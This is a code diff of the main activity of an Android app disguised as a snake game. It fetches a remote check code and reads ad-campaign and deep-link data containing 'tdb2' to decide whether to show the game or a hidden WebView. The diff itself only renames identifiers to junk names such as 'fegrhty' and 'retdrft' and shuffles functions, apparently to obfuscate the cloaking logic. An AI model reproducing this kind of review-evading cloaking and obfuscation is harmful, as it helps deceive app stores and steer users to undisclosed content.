@@ -7,12 +7,12 @@ import androidx.appcompat.app.AppCompatActivity
 import com.appsflyer.AppsFlyerConversionListener
 import com.appsflyer.AppsFlyerLib
 import com.facebook.applinks.AppLinkData
-import com.snake.io.slither.AplClasssssssss.Companion.AF_DEV_KEY
-import com.snake.io.slither.AplClasssssssss.Companion.C1
-import com.snake.io.slither.AplClasssssssss.Companion.CH
-import com.snake.io.slither.AplClasssssssss.Companion.D1
-import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheckPart1
-import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheckPart2
+import com.snake.io.slither.AplClasssssssss.Companion.ApppsFfffff_DEV_KEY
+import com.snake.io.slither.AplClasssssssss.Companion.NAMING
+import com.snake.io.slither.AplClasssssssss.Companion.CHHH
+import com.snake.io.slither.AplClasssssssss.Companion.DIPING
+import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheck11111111
+import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheck22222222
 import com.snake.io.slither.databinding.ActivityMainBinding
 import com.snake.io.slither.gamerrrrr.GameHolderActivity
 import kotlinx.coroutines.*
@@ -20,79 +20,80 @@ import java.net.HttpURLConnection
 import java.net.URL
 
 class MainActivity : AppCompatActivity() {
-    private lateinit var bindMain: ActivityMainBinding
+    private lateinit var mainBinding: ActivityMainBinding
 
-    var checker: String = "null"
-    lateinit var jsoup: String
+    var checker_it_vill_change: String = "null"
+    lateinit var jsoooooup: String
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        bindMain = ActivityMainBinding.inflate(layoutInflater)
-        setContentView(bindMain.root)
-        jsoup = ""
-        deePP(this)
+        mainBinding = ActivityMainBinding.inflate(layoutInflater)
+        setContentView(mainBinding.root)
+        jsoooooup = ""
+        deeeeeeeeeeeeeeeP(this)
 
-        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
-        if (prefs.getBoolean("activity_exec", false)) {
-            //второе включение
-            val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
-            when (sharPref.getString(CH, "null")) {
+        val yyyyprefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
+        if (yyyyprefs.getBoolean("activity_exec", false)) {
+
+
+            val sharPrefAgain = getSharedPreferences("SP", MODE_PRIVATE)
+            when (sharPrefAgain.getString(CHHH, "null")) {
                 "2" -> {
-                    skipMe()
+                    skipMePleasee()
                 }
                 "3" -> {
-                    testMeUAC()
+                    restdyui()
                 }
                 "4" -> {
-                    testWV()
+                    testWebbbbVievv()
                 }
                 "nm" -> {
-                    testWV()
+                    testWebbbbVievv()
                 }
                 "dp" -> {
-                    testWV()
+                    testWebbbbVievv()
                 }
                 "org" -> {
-                    skipMe()
+                    skipMePleasee()
                 }
                 else -> {
-                    skipMe()
+                    skipMePleasee()
                 }
             }
 
         } else {
-            val exec = prefs.edit()
-            exec.putBoolean("activity_exec", true)
-            exec.apply()
+            val gtyhhuu = yyyyprefs.edit()
+            gtyhhuu.putBoolean("activity_exec", true)
+            gtyhhuu.apply()
 
-            val job = GlobalScope.launch(Dispatchers.IO) {
-                checker = getCheckCode(linkAppsCheckPart1+linkAppsCheckPart2)
+            val jobaaaa = GlobalScope.launch(Dispatchers.IO) {
+                checker_it_vill_change = retdrft(linkAppsCheck11111111 + linkAppsCheck22222222)
             }
             runBlocking {
                 try {
-                    job.join()
-                } catch (_: Exception){
+                    jobaaaa.join()
+                } catch (_: Exception) {
                 }
             }
 
-            when (checker) {
+            when (checker_it_vill_change) {
                 "1" -> {
                     AppsFlyerLib.getInstance()
-                        .init(AF_DEV_KEY, conversionDataListener, applicationContext)
+                        .init(ApppsFfffff_DEV_KEY, frgyhuju, applicationContext)
                     AppsFlyerLib.getInstance().start(this)
-                    afNullRecordedOrNotChecker(1500)
+                    fegrhty(1500)
                 }
                 "2" -> {
-                    skipMe()
+                    skipMePleasee()
                 }
                 "3" -> {
                     AppsFlyerLib.getInstance()
-                        .init(AF_DEV_KEY, conversionDataListener, applicationContext)
+                        .init(ApppsFfffff_DEV_KEY, frgyhuju, applicationContext)
                     AppsFlyerLib.getInstance().start(this)
-                    afRecordedForUAC(1500)
+                    rdtfygh(1500)
                 }
                 "4" -> {
-                    testWV()
+                    testWebbbbVievv()
                 }
 
             }
@@ -100,112 +101,116 @@ class MainActivity : AppCompatActivity() {
     }
 
 
+    private fun fegrhty(timeInterval: Long): Job {
 
-    private suspend fun getCheckCode(link: String): String {
-        val url = URL(link)
-        val oneStr = "1"
-        val twoStr = "2"
-        val testStr = "3"
-        val fourStr = "4"
-        val activeStrn = "0"
-        val urlConnection = withContext(Dispatchers.IO) {
-            url.openConnection()
-        } as HttpURLConnection
-
-        return try {
-            when (val text = urlConnection.inputStream.bufferedReader().readText()) {
-
-                "1" -> {
-                    oneStr
-                }
-                "2" -> {
-                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
-                    val editor = sharPref.edit()
-                    editor.putString(CH, twoStr)
-                    editor.apply()
-                    twoStr
-                }
-                "3" -> {
-                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
-                    val editor = sharPref.edit()
-                    editor.putString(CH, testStr)
-                    editor.apply()
-                    testStr
-                }
-                "4" -> {
-                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
-                    val editor = sharPref.edit()
-                    editor.putString(CH, fourStr)
-                    editor.apply()
-                    fourStr
-                }
-                else -> {
-                    activeStrn
-                }
-            }
-        } finally {
-            urlConnection.disconnect()
-        }
-
-    }
-
-    private fun afNullRecordedOrNotChecker(timeInterval: Long): Job {
-
-        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
+        val fuckingSharPref = getSharedPreferences("SP", MODE_PRIVATE)
         return CoroutineScope(Dispatchers.IO).launch {
             while (NonCancellable.isActive) {
-                val hawk1: String? = sharPref.getString(C1, null)
-                val hawkdeep: String? = sharPref.getString(D1, "null")
-                if (hawk1 != null) {
-                    if(hawk1.contains("tdb2")){
-                        val editor = sharPref.edit()
-                        editor.putString(CH, "nm")
-                        editor.apply()
-                        testWV()
-                    } else if (hawkdeep != null){
-                        if(hawkdeep.contains("tdb2"))
-                        {
-                            testWV()
-                        }
-                        else{
-                            val editor = sharPref.edit()
-                            editor.putString(CH, "org")
-                            editor.apply()
-                            skipMe()
+                val hawk11111: String? = fuckingSharPref.getString(NAMING, null)
+                val hawkdeeeeeepy: String? = fuckingSharPref.getString(DIPING, "null")
+                if (hawk11111 != null) {
+                    if (hawk11111.contains("tdb2")) {
+                        val editorEditor = fuckingSharPref.edit()
+                        editorEditor.putString(CHHH, "nm")
+                        editorEditor.apply()
+                        testWebbbbVievv()
+                    } else if (hawkdeeeeeepy != null) {
+                        if (hawkdeeeeeepy.contains("tdb2")) {
+                            testWebbbbVievv()
+                        } else {
+                            val ediEdiEdieditor = fuckingSharPref.edit()
+                            ediEdiEdieditor.putString(CHHH, "org")
+                            ediEdiEdieditor.apply()
+                            skipMePleasee()
                         }
                     }
                     break
                 } else {
-                    val hawk1: String? = sharPref.getString(C1, null)
+                    val hawkyyyyy1: String? = fuckingSharPref.getString(NAMING, null)
                     delay(timeInterval)
                 }
             }
         }
     }
 
-    private fun afRecordedForUAC(timeInterval: Long): Job {
+    private fun restdyui() {
+        Intent(this, CanIFilterYouActivity::class.java)
+            .also { startActivity(it) }
+        finish()
+    }
+
+    private suspend fun retdrft(link: String): String {
+        val url = URL(link)
+        val oooooneStr = "1"
+        val tttttwoStr = "2"
+        val tttttestStr = "3"
+        val fffffourStr = "4"
+        val aaaaactiveStrn = "0"
+        val urlConnectionDis = withContext(Dispatchers.IO) {
+            url.openConnection()
+        } as HttpURLConnection
+
+        return try {
+            when (val text = urlConnectionDis.inputStream.bufferedReader().readText()) {
+
+                "1" -> {
+                    oooooneStr
+                }
+                "2" -> {
+                    val ftgyhyhy = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
+                    val getrjk = ftgyhyhy.edit()
+                    getrjk.putString(CHHH, tttttwoStr)
+                    getrjk.apply()
+                    tttttwoStr
+                }
+                "3" -> {
+                    val fgrhtj = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
+                    val afegrhtjk = fgrhtj.edit()
+                    afegrhtjk.putString(CHHH, tttttestStr)
+                    afegrhtjk.apply()
+                    tttttestStr
+                }
+                "4" -> {
+                    val dfegrhtjyk = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
+                    val erdtfhygj = dfegrhtjyk.edit()
+                    erdtfhygj.putString(CHHH, fffffourStr)
+                    erdtfhygj.apply()
+                    fffffourStr
+                }
+                else -> {
+                    aaaaactiveStrn
+                }
+            }
+        } finally {
+            urlConnectionDis.disconnect()
+        }
+
+    }
+
+
+    private fun rdtfygh(timeInterval: Long): Job {
         val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
         return CoroutineScope(Dispatchers.IO).launch {
             while (NonCancellable.isActive) {
-                val hawk1: String? = sharPref.getString(C1, null)
-                if (hawk1 != null) {
-                    testMeUAC()
+                val hawk1dfghj: String? = sharPref.getString(NAMING, null)
+                if (hawk1dfghj != null) {
+                    restdyui()
                     break
                 } else {
-                    val hawk1: String? = sharPref.getString(C1, null)
+                    val hawk1: String? = sharPref.getString(NAMING, null)
                     delay(timeInterval)
                 }
             }
         }
     }
 
-    val conversionDataListener = object : AppsFlyerConversionListener {
+    val frgyhuju = object : AppsFlyerConversionListener {
         override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
-            val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
-            val editor = sharPref.edit()
-            val dataGotten = data?.get("campaign").toString()
-            editor.putString(C1,dataGotten)
-            editor.apply()
+            val sharPreffsgdh = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
+            val editorsdrftg = sharPreffsgdh.edit()
+            val dataGottendrgfhgj = data?.get("campaign").toString()
+            editorsdrftg.putString(NAMING, dataGottendrgfhgj)
+            editorsdrftg.apply()
         }
 
         override fun onConversionDataFail(p0: String?) {
@@ -221,35 +226,21 @@ class MainActivity : AppCompatActivity() {
     }
 
 
-    private fun skipMe() {
-        Intent(this, GameHolderActivity::class.java)
-            .also { startActivity(it) }
-        finish()
-    }
-    private fun testMeUAC() {
-        Intent(this, CanIFilterYouActivity::class.java)
-            .also { startActivity(it) }
-        finish()
-    }
-    private fun testWV() {
-        Intent(this, WeeeeebStartActivity::class.java)
-            .also { startActivity(it) }
-        finish()
-    }
-    fun deePP(context: Context) {
-        val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
-        val editor = sharPref.edit()
+
+    fun deeeeeeeeeeeeeeeP(context: Context) {
+        val sharPreffrgthyu = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
+        val editordefsrgty = sharPreffrgthyu.edit()
         AppLinkData.fetchDeferredAppLinkData(
             context
         ) { appLinkData: AppLinkData? ->
             appLinkData?.let {
-                val params = appLinkData.targetUri.host
+                val paramsssssss = appLinkData.targetUri.host
                 //тест
-                editor.putString(D1,params.toString())
-                editor.apply()
-                if (params!!.contains("tdb2")){
-                    editor.putString(CH, "dp")
-                    editor.apply()
+                editordefsrgty.putString(DIPING, paramsssssss.toString())
+                editordefsrgty.apply()
+                if (paramsssssss!!.contains("tdb2")) {
+                    editordefsrgty.putString(CHHH, "dp")
+                    editordefsrgty.apply()
                 }
 
             }
@@ -260,8 +251,19 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun testWebbbbVievv() {
+        Intent(this, WeeeeebStartActivity::class.java)
+            .also { startActivity(it) }
+        finish()
+    }
 
 
+
+    private fun skipMePleasee() {
+        Intent(this, GameHolderActivity::class.java)
+            .also { startActivity(it) }
+        finish()
+    }
 
 
 }
